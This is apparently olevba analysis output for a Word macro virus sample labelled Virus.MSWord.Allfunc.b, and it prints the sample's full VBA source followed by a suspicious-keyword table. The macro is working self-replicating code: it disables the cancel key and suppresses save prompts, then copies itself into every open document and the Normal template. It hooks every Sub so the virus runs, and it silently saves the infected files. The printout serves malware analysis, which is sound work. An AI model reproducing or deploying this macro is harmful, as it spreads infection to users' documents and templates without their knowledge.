olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allfunc.b-eaeb5bbfde32d7cddcdf78992f3a3ef48804b985
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allfunc.b-eaeb5bbfde32d7cddcdf78992f3a3ef48804b985 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function Cancer()
Application.EnableCancelKey = wdCancelDisabled
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Set TD = ThisDocument.VBProject.VBComponents
For FindCode = 1 To TD.Count
If TD.Item(FindCode).CodeModule.CountOfLines > 0 Then
For CodeLines = 1 To TD.Item(FindCode).CodeModule.CountOfLines
If TD.Item(FindCode).CodeModule.Lines(CodeLines, 1) = "Private Function Cancer()" Then
MyCode = TD.Item(FindCode).CodeModule.Lines(CodeLines, 40)
End If
Next
End If
Next
For MainLoop = 1 To 2
If MainLoop = 1 Then Set Target = Documents Else Set Target = Templates
For TargetCount = 1 To Target.Count
Set TargetComponents = Target(TargetCount).VBProject.VBComponents
For ModuleCount = 1 To TargetComponents.Count
Function_Exist = False
TargetCodeChanged = False
For TargetLines = 1 To TargetComponents(ModuleCount).CodeModule.CountOfLines
If TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) = "Private Function Cancer()" Then Function_Exist = True
If Left(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 12) = "Private Sub " And Right(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 8) <> ": Cancer" Then
TargetComponents(ModuleCount).CodeModule.ReplaceLine TargetLines, TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) & ": Cancer"
TargetCodeChanged = True
ElseIf Left(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 4) = "Sub " And Right(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 8) <> ": Cancer" Then
TargetComponents(ModuleCount).CodeModule.ReplaceLine TargetLines, TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) & ": Cancer"
TargetCodeChanged = True
End If
Next
If Function_Exist = False Then TargetComponents(ModuleCount).CodeModule.AddFromString MyCode
If Function_Exits = False Or TargetCodeChanged = True Then
If MainLoop = 1 Then Documents(TargetCount).SaveAs FileName:=Documents(TargetCount).FullName
If MainLoop = 2 Then Templates(TargetCount).Save
End If
Next
Next
Next
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

